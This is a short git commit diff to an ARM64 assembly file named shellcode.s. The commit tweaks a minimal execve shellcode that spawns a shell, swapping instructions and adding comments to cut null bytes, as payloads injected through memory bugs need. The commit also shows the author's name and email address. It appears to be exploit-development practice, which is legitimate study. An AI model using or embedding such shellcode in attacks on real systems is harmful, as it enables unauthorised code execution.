508bb0b9864624dcc45da5bd58b5bf412ae17f88
lgraham076 <langstongraham@gmail.com>
2025-05-27 16:52:14 -0500

    Removed padding from simple shell

--- shellcode.s
+++ shellcode.s
@@ -7,11 +7,11 @@ sh:
 .global _start
 
 _start:
-    ldr x0, =sh
-    mov x1, xzr
+    adr x0, sh      // Use adr instead of ldr for fewer null bytes
+    mov x1, xzr     // Move from zero register instead of using literal
     mov x2, xzr
-    mov x8, #221
-    svc #0
+    mov x8, #221    // Call execve
+    svc #0x1337     // 
 
     //mov x0, #0
     //mov w8, #93
